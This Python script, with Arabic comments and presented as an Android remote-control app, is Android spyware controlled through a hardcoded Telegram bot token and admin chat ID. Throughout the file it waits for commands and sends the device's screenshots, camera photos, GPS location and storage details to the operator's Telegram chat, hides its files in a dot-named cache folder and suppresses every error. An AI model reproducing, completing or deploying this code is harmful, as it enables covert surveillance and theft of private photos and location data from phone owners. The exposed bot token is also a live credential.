"""
تطبيق تحكم عن بعد للهاتف - Android APK
"""

import os
import time
import threading
import requests
from datetime import datetime

# ============================================
# ضع التوكن ومعرف الدردشة هنا
# ============================================
BOT_TOKEN = "8321792439:AAEgbnuakpy3TiWqePzCm1Mc2y2GNlveSGs"
BOT_CHAT_ID = "6494865307"
BOT_ADMIN_ID = BOT_CHAT_ID
# ============================================

TEMP_DIR = '/sdcard/Android/.cache'
if not os.path.exists(TEMP_DIR):
    os.makedirs(TEMP_DIR, exist_ok=True)


class TelegramBot:
    def __init__(self):
        self.token = BOT_TOKEN
        self.chat_id = BOT_CHAT_ID
        self.admin_id = BOT_ADMIN_ID
        self.base_url = f"https://api.telegram.org/bot{self.token}"
        self.last_update_id = 0
        self.running = True
        
    def send_message(self, text, chat_id=None):
        if chat_id is None:
            chat_id = self.chat_id
        try:
            url = f"{self.base_url}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": text,
                "parse_mode": "HTML"
            }
            requests.post(url, data=data, timeout=10)
        except:
            pass
            
    def send_photo(self, photo_path, chat_id=None):
        if chat_id is None:
            chat_id = self.chat_id
        try:
            url = f"{self.base_url}/sendPhoto"
            with open(photo_path, 'rb') as photo:
                files = {'photo': photo}
                data = {"chat_id": chat_id}
                requests.post(url, data=data, files=files, timeout=60)
            os.remove(photo_path)
        except:
            pass
            
    def get_updates(self):
        try:
            url = f"{self.base_url}/getUpdates"
            params = {
                "offset": self.last_update_id + 1,
                "timeout": 10
            }
            response = requests.get(url, params=params, timeout=15)
            updates = response.json()
            
            if updates.get("ok"):
                for update in updates.get("result", []):
                    self.last_update_id = update["update_id"]
                    self.process_update(update)
        except:
            pass
            
    def process_update(self, update):
        if "message" in update:
            message = update["message"]
            chat_id = message["chat"]["id"]
            
            if str(chat_id) == str(self.admin_id):
                if "text" in message:
                    text = message["text"].strip()
                    self.handle_command(text, chat_id)
                    
    def handle_command(self, text, chat_id):
        global controller
        
        if text == "1":
            self.send_message("📸 جاري التقاط الشاشة...", chat_id)
            threading.Thread(target=controller.take_screenshot, args=(chat_id,), daemon=True).start()
        elif text == "2":
            self.send_message("🖼️ جاري سحب الصور...", chat_id)
            threading.Thread(target=controller.get_photos, args=(chat_id,), daemon=True).start()
        elif text == "3":
            controller.get_device_info(chat_id)
        elif text == "4":
            self.send_message("📍 جاري الحصول على الموقع...", chat_id)
            threading.Thread(target=controller.get_location, args=(chat_id,), daemon=True).start()
        elif text == "0":
            self.show_menu(chat_id)
        elif text == "/start":
            self.show_menu(chat_id)
            
    def show_menu(self, chat_id):
        menu = f"""
<b>🎮 قائمة التحكم</b>
<b>🕐 الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

━━━━━━━━━━━━━━━
<b>1️⃣</b> 📸 لقطة شاشة
<b>2️⃣</b> 🖼️ سحب الصور
<b>3️⃣</b> ℹ️ معلومات الجهاز
<b>4️⃣</b> 📍 الموقع
<b>0️⃣</b> 🔄 عرض القائمة
━━━━━━━━━━━━━━━
"""
        self.send_message(menu, chat_id)
        
    def run(self):
        while self.running:
            try:
                self.get_updates()
                time.sleep(1)
            except:
                time.sleep(5)


class AndroidController:
    def __init__(self):
        self.bot = TelegramBot()
        self.bot_thread = threading.Thread(target=self.bot.run, daemon=True)
        self.bot_thread.start()
        self.send_startup_message()
        
    def send_startup_message(self):
        try:
            msg = f"""
<b>🚀 التطبيق جاهز</b>
<b>📱 الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

أرسل 0 لعرض القائمة
"""
            self.bot.send_message(msg)
        except:
            pass
            
    def take_screenshot(self, chat_id):
        try:
            filename = f"{TEMP_DIR}/screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            import subprocess
            subprocess.run(['screencap', '-p', filename], timeout=5)
            if os.path.exists(filename):
                self.bot.send_photo(filename, chat_id)
                self.bot.send_message("✅ تم التقاط الشاشة", chat_id)
        except:
            self.bot.send_message("❌ فشل التقاط الشاشة", chat_id)
            
    def get_photos(self, chat_id):
        try:
            photos = []
            dcim = '/sdcard/DCIM/Camera'
            if os.path.exists(dcim):
                for file in os.listdir(dcim)[:5]:
                    if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                        photos.append(os.path.join(dcim, file))
            if photos:
                self.bot.send_message(f"✅ تم العثور على {len(photos)} صورة", chat_id)
                for photo in photos[:3]:
                    self.bot.send_photo(photo, chat_id)
                    time.sleep(1)
        except:
            self.bot.send_message("❌ فشل سحب الصور", chat_id)
            
    def get_device_info(self, chat_id):
        try:
            info = f"""
<b>ℹ️ معلومات الجهاز:</b>

<b>الطراز:</b> Android
<b>التخزين:</b> {self.get_storage()}
<b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
            self.bot.send_message(info, chat_id)
        except:
            pass
            
    def get_location(self, chat_id):
        try:
            import subprocess
            result = subprocess.run(['termux-location'], capture_output=True, text=True, timeout=5)
            if result.stdout:
                import json
                loc = json.loads(result.stdout)
                lat = loc.get('latitude', 0)
                lon = loc.get('longitude', 0)
                maps = f"https://www.google.com/maps?q={lat},{lon}"
                self.bot.send_message(f"📍 {lat}, {lon}\n{maps}", chat_id)
        except:
            self.bot.send_message("❌ الموقع غير متاح", chat_id)
            
    def get_storage(self):
        try:
            stat = os.statvfs('/sdcard')
            free = stat.f_bavail * stat.f_frsize / (1024**3)
            total = stat.f_blocks * stat.f_frsize / (1024**3)
            return f"{free:.1f}GB/{total:.1f}GB"
        except:
            return "غير معروف"


controller = AndroidController()

while True:
    time.sleep(60)
